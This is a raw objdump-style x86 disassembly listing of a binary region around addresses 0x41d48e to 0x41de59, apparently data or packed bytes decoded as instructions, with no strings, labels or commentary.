  41d48e:	sub    al,0x4
  41d490:	call   0xfa63:0xaa2f086c
  41d497:	add    ecx,DWORD PTR [edi-0x69030689]
  41d49d:	or     eax,DWORD PTR [si]
  41d4a0:	mov    ds:0x9e492b41,al
  41d4a5:	xor    ch,BYTE PTR [edx+0x0]
	...
  41d4cf:	add    BYTE PTR [edi-0x62],cl
  41d4d2:	sub    esp,DWORD PTR [ecx]
  41d4d4:	dec    eax
  41d4d5:	jno    0x41d50b
  41d4d7:	add    al,0xec
  41d4d9:	push   0x99f4aa3f
  41d4de:	inc    ecx
  41d4df:	scas   eax,DWORD PTR es:[edi]
  41d4e0:	in     al,dx
  41d4e1:	je     0x41d517
  41d4e3:	clc    
  41d4e4:	pop    eax
  41d4e5:	jno    0x41d51b
  41d4e7:	lods   al,BYTE PTR ds:[esi]
  41d4e8:	int    0x6e
  41d4ea:	inc    esi
  41d4eb:	mul    dl
  41d4ed:	outs   dx,BYTE PTR ds:[esi]
  41d4ee:	jnp    0x41d4d9
  41d4f0:	cs xchg esi,eax
  41d4f2:	inc    esi
  41d4f3:	mov    ch,0x32
  41d4f5:	push   0x9a03ac52
  41d4fa:	ins    BYTE PTR es:[edi],dx
  41d4fb:	mov    BYTE PTR [esi],ch
  41d4fd:	stos   BYTE PTR es:[edi],al
  41d4fe:	arpl   WORD PTR [eax],ax
  41d500:	inc    esi
  41d501:	adc    BYTE PTR [ecx+edi*2+0x45],0x7b
  41d506:	dec    esp
  41d507:	imul   esp,DWORD PTR [edi+0x7839777f],0x835319e
  41d511:	or     eax,0xdf82d36
  41d516:	das    
  41d517:	xor    ah,BYTE PTR [eax]
  41d519:	or     esi,DWORD PTR [esi*1+0x433f022a]
  41d520:	mov    dl,BYTE PTR [esi]
  41d522:	sub    al,BYTE PTR [ebp-0x77]
  41d525:	adc    ebp,DWORD PTR [edi]
  41d527:	xor    eax,0x372d174b
  41d52c:	jbe    0x41d537
  41d52e:	inc    eax
  41d52f:	jge    0x41d5a6
  41d531:	pop    eax
  41d532:	gs jae 0x41d535
	...
  41d55d:	sbb    BYTE PTR [ecx+0x74],cl
  41d560:	jo     0x41d598
  41d562:	dec    ebp
  41d563:	jbe    0x41d5d8
  41d565:	xchg   ebx,eax
  41d566:	inc    esi
  41d567:	outs   dx,BYTE PTR ds:[esi]
  41d568:	imul   esi,DWORD PTR ds:0x18736558,0x63707449
  41d572:	inc    esi
  41d573:	outs   dx,BYTE PTR ds:[esi]
  41d574:	imul   eax,DWORD PTR [ebp+0x65],0x506b5054
  41d57b:	jne    0x41d5de
  41d57d:	pop    edx
  41d57e:	jp     0x41d5f2
  41d580:	cs jmp 0x41d5d9
  41d583:	jo     0x41d585
  41d585:	mov    ebx,0xf2565076
  41d58a:	push   edi
  41d58b:	pop    ebp
  41d58c:	fmul   DWORD PTR [si+0x2e]
  41d590:	jno    0x41d578
  41d592:	pop    edx
  41d593:	pop    esp
  41d594:	push   edx
  41d595:	fld    QWORD PTR [edi+0x6e]
  41d598:	outs   dx,DWORD PTR ds:[esi]
  41d599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d59a:	dec    ebp
  41d59b:	data16 je 0x41d571
  41d59e:	jns    0x41d60b
  41d5a0:	ins    DWORD PTR es:[edi],dx
  41d5a1:	sbb    al,0x34
  41d5a3:	adc    esi,DWORD PTR [ecx+0x4f]
  41d5a6:	add    ebx,edx
  41d5a8:	arpl   WORD PTR [eax],di
  41d5aa:	rol    BYTE PTR [eax],1
  41d5ac:	dec    esi
  41d5ad:	outs   dx,DWORD PTR ds:[esi]
  41d5ae:	shl    DWORD PTR ds:0xcdb4a47,0x0
  41d5b5:	(bad)  
  41d5b7:	xor    DWORD PTR [ebp+0x4f],ebx
  41d5ba:	mov    WORD PTR ds:0xb953874,cs
  41d5c0:	outs   dx,BYTE PTR ds:[esi]
	...
  41d5e9:	add    BYTE PTR [esi+edi*2],bl
  41d5ec:	das    
  41d5ed:	push   ecx
  41d5ee:	ficom  WORD PTR [edx+0x2852630f]
  41d5f4:	and    al,0x44
  41d5f6:	stc    
  41d5f7:	nop
  41d5f8:	adc    esp,DWORD PTR [ecx+eax*1+0x72]
  41d5fc:	or     eax,0x129efa66
  41d601:	add    bh,cl
  41d603:	jbe    0x41d644
  41d605:	inc    edi
  41d606:	enter  0x357e,0x5d
  41d60a:	loop   0x41d64d
  41d60c:	sbb    eax,0x1d4fe563
  41d611:	imul   ebx,DWORD PTR [esp+eax*2],0x37
  41d615:	das    
  41d616:	or     eax,0xb0633b45
  41d61b:	jp     0x41d633
  41d61d:	je     0x41d5d8
  41d61f:	and    DWORD PTR [ebx],edx
  41d621:	pop    edi
  41d622:	mov    eax,0xcf771de8
  41d627:	pop    ss
  41d628:	adc    al,0x74
  41d62a:	sbb    al,0xe4
  41d62c:	aaa    
  41d62d:	das    
  41d62e:	dec    ebp
  41d62f:	cmc    
  41d630:	inc    ecx
  41d631:	jae    0x41d5c3
  41d633:	or     al,0x1e
  41d635:	outs   dx,BYTE PTR ds:[esi]
  41d636:	mov    BYTE PTR [ebx],cl
  41d638:	and    BYTE PTR [edi+0x70],bl
  41d63b:	pop    ss
  41d63c:	add    DWORD PTR [eax+0x67],edx
  41d63f:	and    edx,edx
  41d641:	push   eax
  41d642:	pusha  
  41d643:	pop    ebx
  41d644:	mov    ecx,0x8ac05824
  41d649:	adc    DWORD PTR [ebx-0x55],edx
  41d64c:	fwait
  41d64d:	add    eax,DWORD PTR [eax]
	...
  41d677:	ins    BYTE PTR es:[edi],dx
  41d678:	xchg   edx,eax
  41d679:	fcom   st(2)
  41d67b:	push   0x3f1e799d
  41d680:	mov    cl,BYTE PTR [ebx-0x18a4cfec]
  41d686:	add    ebx,DWORD PTR [ebx+ebx*2]
  41d689:	out    0x3,eax
  41d68b:	sbb    al,0x5b
  41d68d:	out    0x3,eax
  41d68f:	sbb    al,0x5b
  41d691:	out    0x3,eax
  41d693:	sbb    al,0x5b
  41d695:	out    0x3,eax
  41d697:	sbb    al,0x5b
  41d699:	out    0x3,eax
  41d69b:	sbb    al,0x5b
  41d69d:	out    0x3,eax
  41d69f:	sbb    al,0x5b
  41d6a1:	out    0x3,eax
  41d6a3:	sbb    al,0x5b
  41d6a5:	out    0x10,eax
  41d6a7:	add    esi,DWORD PTR [edi+0x69ff1040]
  41d6ad:	aad    0x1f
  41d6af:	lock mov dh,0xe7
  41d6b2:	adc    bl,cl
  41d6b4:	mov    dh,0x0
  41d6b6:	adc    BYTE PTR [edi-0x33ead197],bh
  41d6bc:	mov    edi,0xabcd0415
  41d6c1:	or     ebx,DWORD PTR [ebx]
  41d6c3:	mov    al,0xbf
  41d6c5:	mov    edx,0xfeb6bd24
  41d6ca:	adc    BYTE PTR [edi-0x4fed25a6],bh
  41d6d0:	mov    bl,0xd3
  41d6d2:	push   ds
  41d6d3:	dec    ebp
  41d6d4:	test   bh,dl
  41d6d6:	adc    DWORD PTR [edi-0x55],edi
  41d6d9:	enter  0x11,0x0
	...
  41d701:	add    BYTE PTR [eax],al
  41d703:	add    BYTE PTR [edi+0x5b],bh
  41d706:	mov    edx,0xb3b27012
  41d70b:	push   ds
  41d70c:	sub    eax,0x23ba0084
  41d711:	mov    eax,0xb40ce970
  41d716:	ins    BYTE PTR es:[edi],dx
  41d717:	nop
  41d718:	adc    edi,DWORD PTR [eax-0x4a0341cf]
  41d71e:	ins    BYTE PTR es:[edi],dx
  41d71f:	pushf  
  41d720:	sub    dh,BYTE PTR [ebp-0x50e974a3]
  41d726:	arpl   WORD PTR [edx+0x1f],di
  41d729:	stos   BYTE PTR es:[edi],al
  41d72a:	outs   dx,DWORD PTR ds:[esi]
  41d72b:	lea    edx,[esi]
  41d72d:	scas   eax,DWORD PTR es:[edi]
  41d72e:	arpl   WORD PTR [edx+0x7d6db9f8],di
  41d734:	sbb    dh,BYTE PTR [eax-0x4f45b992]
  41d73a:	ins    DWORD PTR es:[edi],dx
  41d73b:	dec    ebx
  41d73c:	and    BYTE PTR [ebx+0x6b],bl
  41d73f:	inc    esi
  41d740:	xchg   edx,eax
  41d741:	stos   DWORD PTR es:[edi],eax
  41d742:	outs   dx,DWORD PTR ds:[esi]
  41d743:	cmp    eax,0xfa63a879
  41d748:	dec    ebp
  41d749:	mov    edi,0xaa204d6c
  41d74e:	outs   dx,DWORD PTR ds:[esi]
  41d74f:	inc    ebp
  41d750:	sub    DWORD PTR [eax-0x4881059d],0x246e0c70
  41d75a:	jb     0x41d774
  41d75c:	dec    esp
  41d75d:	mov    ebp,0x860b0c74
  41d762:	popa   
  41d763:	std    
  41d764:	dec    esi
  41d765:	stos   DWORD PTR es:[edi],eax
  41d766:	arpl   cx,bp
	...
  41d790:	add    BYTE PTR [edx-0x4b],cl
  41d793:	ins    BYTE PTR es:[edi],dx
  41d794:	adc    BYTE PTR [ecx+edi*4],dh
  41d797:	xor    DWORD PTR [esi],edx
  41d799:	sub    BYTE PTR [edx-0x55bf069d],ch
  41d79f:	arpl   cx,bp
  41d7a1:	sub    dh,BYTE PTR [ebp-0x46ec2f94]
  41d7a7:	xor    DWORD PTR [esi-0x269c57f6],esi
  41d7ad:	pop    ds
  41d7ae:	stos   BYTE PTR es:[edi],al
  41d7af:	outs   dx,DWORD PTR ds:[esi]
  41d7b0:	add    cl,ch
  41d7b2:	ss jno 0x41d81a
  41d7b5:	idiv   BYTE PTR [eax]
  41d7b7:	pusha  
  41d7b8:	outs   dx,DWORD PTR ds:[esi]
  41d7b9:	fldenv [edx]
  41d7bb:	push   0x6e
  41d7bd:	call   0xfd2c:0x9074763d
  41d7c4:	jb     0x41d77a
  41d7c6:	xor    esp,DWORD PTR [esi+0x74]
  41d7c9:	mov    al,ds:0x4a635b6c
  41d7ce:	xor    al,0x72
  41d7d0:	ins    DWORD PTR es:[edi],dx
  41d7d1:	stos   DWORD PTR es:[edi],eax
  41d7d2:	cmp    BYTE PTR [edi+0x6c],bl
  41d7d5:	stos   BYTE PTR es:[edi],al
  41d7d6:	cmp    eax,0x57c5fffd
  41d7db:	add    BYTE PTR [eax],al
  41d7dd:	mov    ch,0x57
  41d7df:	add    BYTE PTR [eax],al
  41d7e1:	mov    ch,0x57
  41d7e3:	add    BYTE PTR [eax],al
  41d7e5:	test   DWORD PTR [edi+0x0],edx
  41d7e8:	add    BYTE PTR [ebp+0x75000057],al
  41d7ee:	push   edi
  41d7ef:	add    BYTE PTR [eax],al
  41d7f1:	jne    0x41d84a
	...
  41d81b:	add    BYTE PTR [eax],al
  41d81d:	add    BYTE PTR [ebp+0x35000057],al
  41d823:	sub    eax,0x2adc666c
  41d828:	bound  esi,QWORD PTR [ebx+0x4b]
  41d82b:	imul   ebp,DWORD PTR ss:[ecx+0x45],0x7
  41d830:	outs   dx,DWORD PTR ds:[esi]
  41d831:	outs   dx,DWORD PTR ds:[esi]
  41d832:	and    esi,DWORD PTR [esi]
  41d834:	imul   esp,DWORD PTR [ebp+0x35],0x10527016
  41d83b:	sub    ebx,DWORD PTR [esi+0x74]
  41d83e:	or     al,0x21
  41d840:	bound  eax,QWORD PTR [eax]
  41d842:	adc    eax,0x3568713e
  41d847:	pop    es
  41d848:	pop    esi
  41d849:	je     0x41d898
  41d84b:	or     ebp,DWORD PTR [ebp+eax*2-0x3]
  41d84f:	xor    edi,ebp
  41d851:	outs   dx,DWORD PTR ds:[esi]
  41d852:	sbb    al,0x6
  41d854:	call   0xeb6467be
  41d859:	jo     0x41d877
  41d85b:	in     eax,0xeb
  41d85d:	mov    dl,BYTE PTR fs:[ecx]
  41d860:	out    dx,eax
  41d861:	jo     0x41d8a5
  41d863:	in     eax,0xf3
  41d865:	imul   esi,DWORD PTR [ebp-0x18],0xffffffe7
  41d869:	jmp    FWORD PTR [esi-0x35]
  41d86c:	jmp    0xf61423de
  41d871:	sub    eax,0xfff4cc48
  41d876:	dec    esi
  41d877:	fucomi st,st(1)
  41d879:	ins    DWORD PTR es:[edi],dx
  41d87a:	xor    ecx,edx
  41d87c:	cmc    
  41d87d:	xor    DWORD PTR [edx],ecx
  41d87f:	test   al,0xf9
  41d881:	jae    0x41d883
	...
  41d8ab:	sbb    al,0xa5
  41d8ad:	in     al,dx
  41d8ae:	cmp    ah,BYTE PTR fs:[ecx+0x49ef70ef]
  41d8b5:	clc    
  41d8b6:	ja     0x41d8c8
  41d8b8:	xor    al,0x24
  41d8ba:	xor    bh,bh
  41d8bc:	xor    esp,DWORD PTR [edx+esi*1]
  41d8bf:	add    BYTE PTR [esp],dh
  41d8c2:	xor    bh,cl
  41d8c4:	xor    edx,esp
  41d8c6:	inc    edx
  41d8c7:	call   0x3c959c42
  41d8cc:	pushf  
  41d8cd:	out    dx,eax
  41d8ce:	jo     0x41d8c0
  41d8d0:	popa   
  41d8d1:	loope  0x41d93d
  41d8d3:	stc    
  41d8d4:	pop    es
  41d8d5:	and    DWORD PTR [ebx-0x36],esp
  41d8d8:	push   esp
  41d8d9:	div    BYTE PTR [esi-0x34]
  41d8dc:	aas    
  41d8dd:	in     eax,0x63
  41d8df:	icebp  
  41d8e0:	inc    esp
  41d8e1:	in     eax,0x71
  41d8e3:	mov    dl,0x52
  41d8e5:	in     eax,dx
  41d8e6:	bound  ecx,QWORD PTR [eax]
  41d8e8:	adc    al,0xe6
  41d8ea:	ins    DWORD PTR es:[edi],dx
  41d8eb:	mov    edi,0xb06ffa25
  41d8f0:	push   esi
  41d8f1:	call   0xda9c9645
  41d8f6:	hlt    
  41d8f7:	nop
  41d8f8:	mov    dl,0xd9
  41d8fa:	out    0x33,eax
  41d8fc:	cdq    
  41d8fd:	mov    ecx,0xbc7b56d0
  41d902:	lock test DWORD PTR [edx-0x4b7f0f2d],eax
  41d909:	int    0xf4
  41d90b:	repz xchg edi,eax
  41d90d:	shl    ch,0x0
	...
  41d938:	jle    0x41d8f3
  41d93a:	mov    esi,0xb485e3fb
  41d93f:	lock push ebp
  41d941:	mov    ah,0x8b
  41d943:	out    dx,eax
  41d944:	jb     0x41d9c5
  41d946:	lods   eax,DWORD PTR ds:[esi]
  41d947:	jmp    0x7f4b:0xf085b84d
  41d94e:	out    0xd4,eax
  41d950:	dec    eax
  41d951:	mov    ecx,0xad52f873
  41d956:	mov    edi,ds
  41d958:	push   esi
  41d959:	mov    dl,0x71
  41d95b:	jmp    0x7047:0x448af37
  41d962:	or     al,0x4
  41d964:	cli    
  41d965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d966:	push   edi
  41d967:	cmp    DWORD PTR ds:[edx-0x19],esi
  41d96b:	jmp    0x41d97c
  41d96d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d96e:	aaa    
  41d96f:	ds dec ecx
  41d971:	jb     0x41d95a
  41d973:	jmp    0x41d964
  41d975:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d976:	aaa    
  41d977:	cmc    
  41d978:	and    eax,0xfa03fe72
  41d97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d97e:	pop    ss
  41d97f:	xor    bl,BYTE PTR [ecx+edi*4]
  41d982:	adc    dh,dh
  41d984:	mov    esi,0xccd43b98
  41d989:	mov    bl,0x13
  41d98b:	out    0xcc,eax
  41d98d:	jo     0x41d99a
  41d98f:	jecxz  0x41d940
  41d991:	pop    edx
  41d992:	sbb    ah,bh
  41d994:	ror    BYTE PTR [edi-0x4dd1fa00],cl
  41d99a:	arpl   ax,si
	...
  41d9c4:	add    BYTE PTR [edi],bl
  41d9c6:	jg     0x41da13
  41d9c8:	(bad)  
  41d9c9:	sbb    DWORD PTR [edx-0x7b013294],edi
  41d9cf:	push   ecx
  41d9d0:	int3   
  41d9d1:	(bad)  
  41d9d2:	xchg   ebp,eax
  41d9d3:	ins    DWORD PTR es:[edi],dx
  41d9d4:	mov    edi,0xa577bdf0
  41d9d9:	pop    ds
  41d9da:	cdq    
  41d9db:	ins    BYTE PTR es:[edi],dx
  41d9dc:	into   
  41d9dd:	clc    
  41d9de:	mov    bl,0x0
  41d9e0:	xchg   ebp,eax
  41d9e1:	aad    0xb4
  41d9e3:	ins    DWORD PTR es:[edi],dx
  41d9e4:	retf   0x84f0
  41d9e7:	inc    edx
  41d9e8:	fwait
  41d9e9:	int3   
  41d9ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9eb:	jno    0x41d971
  41d9ed:	leave  
  41d9ee:	test   BYTE PTR [eax],al
  41d9f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9f1:	int3   
  41d9f2:	mov    ds:0x81b37d67,al
  41d9f7:	add    BYTE PTR [ebp-0x6f855016],ah
  41d9fd:	ret    
  41d9fe:	mov    ah,0x5f
  41da00:	xchg   ebp,eax
  41da01:	iret   
  41da02:	stos   BYTE PTR es:[edi],al
  41da03:	ins    DWORD PTR es:[edi],dx
  41da04:	xchg   DWORD PTR [esi+0x7c5a63b4],esi
  41da0a:	and    BYTE PTR [edx+0x4e],dl
  41da0d:	jp     0x41d9bb
  41da0f:	jne    0x41da59
  41da11:	mov    ?,WORD PTR [ebp-0x428ae2a4]
  41da17:	popa   
  41da18:	push   ecx
  41da19:	bound  ecx,QWORD PTR [eax+edx*2+0x70b058e9]
  41da20:	sub    eax,0x1d00aa79
  41da25:	jae    0x41d9e2
  41da27:	pop    edi
  41da28:	adc    eax,0x0
	...
  41da51:	add    BYTE PTR [ecx+edi*4+0x72],ah
  41da55:	jmp    0x2af8997
  41da5a:	dec    ebp
  41da5b:	xor    DWORD PTR [edx+0x2],0x5fb6f2
  41da62:	cmp    DWORD PTR [edi+ecx*2+0x69],ebx
  41da66:	sub    DWORD PTR [ebx],esi
  41da68:	inc    esi
  41da69:	outs   dx,BYTE PTR ds:[esi]
  41da6a:	sbb    esi,DWORD PTR [eax]
  41da6c:	sub    edx,DWORD PTR [ecx-0x5]
  41da6f:	push   es
  41da70:	std    
  41da71:	dec    esi
  41da72:	jmp    0xbb4245a5
  41da77:	ss jae 0x41dae9
  41da7a:	out    0x2e,eax
  41da7c:	jno    0x41dae3
  41da7e:	out    0x6d,al
  41da80:	fs popa 
  41da82:	mov    ecx,0xe369535b
  41da87:	adc    eax,0x2cf55051
  41da8c:	data16 je 0x41da67
  41da8f:	sub    al,0x2b
  41da91:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41da93:	pop    ebx
  41da94:	aas    
  41da95:	dec    esp
  41da96:	xchg   esi,eax
  41da97:	push   cs
  41da98:	inc    ecx
  41da99:	pop    esp
  41da9a:	scas   al,BYTE PTR es:[edi]
  41da9b:	sub    ax,0xe443
  41da9f:	pop    ss
  41daa0:	xor    al,0x34
  41daa2:	je     0x41db0e
  41daa4:	cmp    eax,0x2a196839
  41daa9:	xor    DWORD PTR [edi+esi*1+0x2f],esp
  41daad:	sub    eax,0x3035166d
  41dab2:	xor    BYTE PTR [edi+0x30],ah
  41dab5:	cmp    BYTE PTR [eax],al
	...
  41dadf:	xor    eax,0x26424116
  41dae4:	ins    DWORD PTR es:[edi],dx
  41dae5:	inc    esi
  41dae6:	inc    esi
  41dae7:	sub    DWORD PTR [edx+0x5c],ebx
  41daea:	dec    ecx
  41daeb:	rol    DWORD PTR [esi],cl
  41daed:	outs   dx,DWORD PTR ds:[esi]
  41daee:	outs   dx,DWORD PTR ds:[esi]
  41daef:	out    0xb,al
  41daf1:	bound  esi,QWORD PTR [edx+0x2b]
  41daf4:	xor    ch,BYTE PTR [edi+0x33]
  41daf7:	addr16 pop ebx
  41daf9:	outs   dx,DWORD PTR ds:[esi]
  41dafa:	gs aaa 
  41dafc:	sub    DWORD PTR [edx+0x72],esp
  41daff:	ss jno 0x41db7a
  41db02:	ins    DWORD PTR es:[edi],dx
  41db03:	sbb    al,0x56
  41db05:	add    al,0x5c
  41db07:	fisub  DWORD PTR [ebp-0x2c]
  41db0a:	inc    esp
  41db0b:	rcr    DWORD PTR ds:0x31ae62f5,0xc8
  41db12:	push   eax
  41db13:	ror    BYTE PTR [ebp-0x1e],1
  41db16:	xor    edx,esi
  41db18:	push   ebp
  41db19:	jecxz  0x41db8e
  41db1b:	sbb    al,0xe3
  41db1d:	les    ebx,FWORD PTR [esi-0x78]
  41db20:	adc    ebp,DWORD PTR [ebx]
  41db22:	fs jge 0x41db25
  41db25:	add    DWORD PTR [ecx+ebx*2+0x1],ebx
  41db29:	cmc    
  41db2a:	jo     0x41dab7
  41db2c:	push   cs
  41db2d:	cmc    
  41db2e:	pop    ebx
  41db2f:	pop    ebp
  41db30:	lock ret 0x4c53
  41db34:	xor    al,0xcc
  41db36:	ins    DWORD PTR es:[edi],dx
  41db37:	push   0x416def17
  41db3c:	shl    BYTE PTR [eax],0x43
  41db3f:	push   esp
  41db40:	(bad)  
  41db41:	in     al,dx
  41db42:	ins    BYTE PTR es:[edi],dx
	...
  41db6b:	add    BYTE PTR [esi-0x31],cl
  41db6e:	out    dx,al
  41db6f:	jmp    FWORD PTR [edx-0x25]
  41db72:	jmp    0x3d40:0xf4cf4a66
  41db79:	shr    eax,1
  41db7b:	bound  ebx,QWORD PTR [edi-0x5e]
  41db7e:	call   0xf5e014e6
  41db83:	data16 std 
  41db85:	xchg   edi,ebp
  41db87:	jmp    eax
  41db89:	pusha  
  41db8a:	and    al,0x47
  41db8c:	loope  0x41dbe1
  41db8e:	(bad)  
  41db8f:	push   ebx
  41db90:	in     al,dx
  41db91:	push   ebx
  41db92:	aam    0x5e
  41db94:	out    dx,eax
  41db95:	pusha  
  41db96:	rep ins BYTE PTR es:[edi],dx
  41db98:	out    dx,al
  41db99:	xchg   edi,eax
  41db9a:	out    dx,eax
  41db9b:	(bad)  
  41db9c:	fild   WORD PTR [ebx-0x3f]
  41db9f:	dec    edi
  41dba0:	aad    0x29
  41dba2:	and    DWORD PTR [eax],eax
  41dba4:	fcomp  QWORD PTR [edx+0x31]
  41dba7:	xor    eax,0x4d613710
  41dbac:	sbb    ebx,esi
  41dbae:	adc    eax,DWORD PTR [esi+esi*2]
  41dbb1:	pop    ebx
  41dbb2:	add    dh,al
  41dbb4:	dec    ecx
  41dbb5:	pushf  
  41dbb6:	xor    DWORD PTR ds:0x4d4136f0,esi
  41dbbc:	sbb    ebx,esi
  41dbbe:	repz add esi,DWORD PTR [esi+0x5b]
  41dbc2:	add    dh,al
  41dbc4:	or     DWORD PTR [ecx+0x375034b1],ebx
  41dbca:	mov    eax,ds:0xd3de1b4d
  41dbcf:	add    eax,DWORD PTR [eax]
	...
  41dbf9:	mov    dh,0x5a
  41dbfb:	rol    ch,0x9
  41dbfe:	pop    esi
  41dbff:	out    0x3,eax
  41dc01:	sbb    al,0x78
  41dc03:	div    DWORD PTR [ecx]
  41dc05:	inc    esp
  41dc06:	pop    ebx
  41dc07:	call   0x4de2:0xb6a779ec
  41dc0e:	mov    eax,0xba3acec3
  41dc13:	cdq    
  41dc14:	in     al,dx
  41dc15:	dec    esp
  41dc16:	scas   al,BYTE PTR es:[edi]
  41dc17:	(bad)  
  41dc18:	mul    DWORD PTR [edi-0x6c]
  41dc1b:	jge    0x41dc14
  41dc1d:	ds test eax,0x7b2fe695
  41dc23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc24:	sti    
  41dc25:	cmp    ebp,DWORD PTR [edi-0x56c10e7a]
  41dc2b:	mov    ecx,edx
  41dc2d:	or     DWORD PTR [edi-0x4bf80fb4],esp
  41dc33:	and    eax,0x5ab00ded
  41dc38:	loopne 0x41dc26
  41dc3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc3b:	repnz fidiv DWORD PTR ds:[ebp+0x5b1c324c]
  41dc43:	out    0x3,eax
  41dc45:	sbb    al,0xbc
  41dc47:	add    cl,ch
  41dc49:	jge    0x41dc68
  41dc4b:	fs jmp 0xe97a375e
  41dc51:	or     DWORD PTR [ebx+0x37],ebx
  41dc54:	jmp    0xe96df99a
  41dc59:	push   es
  41dc5a:	pop    ebx
  41dc5b:	(bad)  
  41dc5c:	jmp    0x41dc61
	...
  41dc85:	add    bl,dh
  41dc87:	pop    edx
  41dc88:	xor    eax,0x345b02e9
  41dc8d:	jmp    0xe9a2f9ce
  41dc92:	out    0x5a,al
  41dc94:	sub    ebp,ecx
  41dc96:	(bad)  
  41dc97:	sbb    al,0x32
  41dc99:	jmp    0xe97a37e8
  41dc9e:	cmp    bl,BYTE PTR [ebx+0x61]
  41dca1:	jmp    0xe97437f3
  41dca6:	ss pop ebx
  41dca8:	xor    cl,ch
  41dcaa:	sub    ebx,DWORD PTR [ebx+0x64]
  41dcad:	jmp    0xe9a1f9af
  41dcb2:	sub    BYTE PTR [ebx+0x66],bl
  41dcb5:	jmp    0xe94237ca
  41dcba:	loop   0x41dc71
  41dcbc:	popa   
  41dcbd:	fwait
  41dcbe:	mov    eax,0xcb8f6dab
  41dcc3:	jg     0x41dd1a
  41dcc5:	or     cl,0x95
  41dcc8:	outs   dx,BYTE PTR ds:[esi]
  41dcc9:	mov    WORD PTR [ebx-0x3e16d581],gs
  41dccf:	test   al,0x70
  41dcd1:	mov    bl,0xf0
  41dcd3:	ins    DWORD PTR es:[edi],dx
  41dcd4:	add    BYTE PTR [edx+0x5e74b688],bl
  41dcda:	jns    0x41dc86
  41dcdc:	arpl   WORD PTR ds:0x4b6db861,di
  41dce2:	jge    0x41dc64
  41dce4:	inc    ecx
  41dce5:	test   DWORD PTR ds:[ecx+0x6d],esi
	...
  41dd10:	add    BYTE PTR [eax],al
  41dd12:	add    bl,cl
  41dd14:	push   esi
  41dd15:	dec    edi
  41dd16:	imul   esi,DWORD PTR [ecx],0x2765503a
  41dd1c:	sub    DWORD PTR [edx+0x72],esp
  41dd1f:	push   ss
  41dd20:	push   edi
  41dd21:	dec    edi
  41dd22:	imul   esi,DWORD PTR [ecx],0x2765503a
  41dd28:	sub    DWORD PTR [edx+0x72],esp
  41dd2b:	push   ebp
  41dd2c:	jnp    0x41dd92
  41dd2e:	pop    esp
  41dd2f:	std    
  41dd30:	das    
  41dd31:	jo     0x41dda7
  41dd33:	inc    ebp
  41dd34:	add    eax,0x4207466
  41dd39:	bound  esi,QWORD PTR [edx+0x23]
  41dd3c:	cmp    ebp,DWORD PTR [edi+0x20]
  41dd3f:	loopne 0x41dd3c
  41dd41:	pop    eax
  41dd42:	push   edi
  41dd43:	loopne 0x41dd7a
  41dd45:	push   edx
  41dd46:	jb     0x41dd21
  41dd48:	push   edi
  41dd49:	dec    edi
  41dd4a:	imul   esp,ecx,0xd765503a
  41dd50:	sub    DWORD PTR [edx+0x72],esp
  41dd53:	and    eax,0x875c647a
  41dd58:	cmp    ch,BYTE PTR [edx+0x6f]
  41dd5b:	mov    eax,ds:0xdc441d3a
  41dd60:	and    eax,0x30b16362
  41dd65:	outs   dx,DWORD PTR ds:[esi]
  41dd66:	jns    0x41dd1d
  41dd68:	add    al,0x66
  41dd6a:	je     0x41dcfc
  41dd6c:	add    al,0x62
  41dd6e:	jb     0x41dd03
  41dd70:	cmp    ch,BYTE PTR [edi+0x20]
  41dd73:	loopne 0x41dd70
  41dd75:	sub    DWORD PTR [ebp+0x0],edx
	...
  41dda0:	cmp    ebp,DWORD PTR es:[edi+0x0]
  41dda4:	xchg   BYTE PTR [esi],ch
  41dda6:	jno    0x41de0d
  41dda8:	mov    dh,0x3a
  41ddaa:	outs   dx,DWORD PTR ds:[esi]
  41ddab:	jbe    0x41dd8d
  41ddad:	and    al,0x1d
  41ddaf:	and    eax,0x735171e1
  41ddb4:	sbb    al,0x8f
  41ddb6:	neg    BYTE PTR [edi]
  41ddb8:	int3   
  41ddb9:	fs add al,0x23
  41ddbc:	out    dx,eax
  41ddbd:	jne    0x41dd8c
  41ddbf:	(bad)  
  41ddc0:	in     eax,0x90
  41ddc2:	in     al,dx
  41ddc3:	pop    esi
  41ddc4:	cmc    
  41ddc5:	xchg   ebx,eax
  41ddc6:	add    al,0x51
  41ddc8:	lds    esp,FWORD PTR [ebp-0x21]
  41ddcb:	push   eax
  41ddcc:	mov    ecx,0xce62f23f
  41ddd1:	adc    DWORD PTR [eax],esp
  41ddd3:	fs loopne 0x41de36
  41ddd6:	ret    0xcc53
  41ddd9:	xor    DWORD PTR [ebp-0x6e13f9e],edi
  41dddf:	(bad)
  41dde4:	scas   al,BYTE PTR es:[edi]
  41dde5:	pop    edx
  41dde6:	lock bound ecx,QWORD PTR [edi-0x7f950726]
  41dded:	add    al,0xd2
  41ddef:	bound  edi,QWORD PTR [esi+0x64]
  41ddf2:	rcr    BYTE PTR [esi-0x78],0x23
  41ddf6:	add    DWORD PTR [ebx+ecx*4+0x21],ecx
  41ddfa:	in     al,dx
  41ddfb:	ins    DWORD PTR es:[edi],dx
  41ddfc:	cmp    al,0xc8
  41ddfe:	jecxz  0x41de73
  41de00:	jge    0x41de06
  41de02:	(bad)  
  41de03:	dec    esi
	...
  41de2c:	add    BYTE PTR [eax+0x1b],dl
  41de2f:	in     eax,dx
  41de30:	(bad)  
  41de31:	cld    
  41de32:	and    edx,ebp
  41de34:	jno    0x41de77
  41de36:	jecxz  0x41de24
  41de38:	pop    ds
  41de39:	(bad)  
  41de3b:	in     eax,dx
  41de3c:	pop    esi
  41de3d:	ds loopne 0x41de1f
  41de40:	inc    DWORD PTR [ebx]
  41de42:	add    al,0x2c
  41de44:	add    ah,bh
  41de46:	add    eax,esi
  41de48:	dec    esp
  41de49:	pop    edx
  41de4a:	cmc    
  41de4b:	int3   
  41de4c:	push   ecx
  41de4d:	pop    ebp
  41de4e:	mov    ebx,0xf41c53c6
  41de53:	rol    BYTE PTR [esi-0x1f],cl
  41de56:	pop    edx
  41de57:	sub    dh,dl
  41de59:	repnz pop edx
